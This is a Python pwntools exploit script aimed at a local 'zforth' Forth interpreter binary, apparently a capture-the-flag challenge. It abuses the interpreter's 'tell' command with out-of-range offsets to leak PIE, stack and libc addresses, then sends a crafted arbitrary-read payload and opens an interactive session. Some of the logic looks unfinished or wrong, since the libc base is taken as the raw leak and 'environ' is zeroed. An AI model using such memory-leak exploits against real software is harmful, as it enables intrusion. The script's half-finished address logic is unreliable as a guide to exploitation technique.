from pwn import *

elf = ELF('./zforth')
libc = elf.libc

def read_addr(pie_leak, addr, length):
    base_addr  = pie_leak + 24576

   
    base_addr = - base_addr - int( 0xffffffff - addr+408) 

    return "%s %i tell" % (hex(base_addr), length)



p = process([elf.path, "core.zf"])

p.recvline()


payload = b"4128 4 tell"
p.sendline(payload)


leak_pie = u32(p.recvline().strip())

elf.address = leak_pie-24576

info("PIE ADDRESS  @%s" % hex(elf.address))


payload = b"4132 4 tell"
p.sendline(payload)

leak_stack = u32(p.recvline().strip())

info("STACK        @%s" % hex(leak_stack))

up_stack = leak_stack + 2656

environ = leak_stack  + 1000


"""

LIBC LEAK

"""

payload = b"4136 4 tell"
p.sendline(payload)


leak_libc = u32(p.recvline().strip())


libc.address = leak_libc

info("LIBC ADDRESS @%s" % hex(libc.address))


environ = 0x0

info("ENVIRON      @%s" % hex(environ))

pause()


print("[+] LAUNCHING MACHIAVELOUS EXPLOIT")



payload = read_addr(elf.address, leak_stack, 10000)


p.sendline(payload)

p.interactive()


